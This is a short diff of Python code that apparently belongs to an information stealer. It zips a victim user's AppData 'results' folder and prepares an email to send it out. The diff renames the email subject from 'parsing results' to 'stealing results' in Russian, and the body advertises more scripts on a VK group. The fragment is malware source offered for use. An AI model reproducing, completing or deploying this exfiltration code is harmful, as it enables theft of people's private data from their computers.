@@ -82,11 +82,11 @@ try:
     file.close()
 
     directory_name = rf'C:\\Users\\{user}\\AppData\\files\\results'
-    zip_name = rf'C:\\Users\\{user}\\AppData\\files\\{user}'
+    zip_name = rf'{user}'
 
     shutil.make_archive(zip_name, 'zip', directory_name)
 
-    subject = rf"Результаты парсинга {user}"
+    subject = rf"Результаты стиллинга {user}"
     body = "Больше скриптов здесь - vk.com/club194891560"
 
     message = MIMEMultipart()
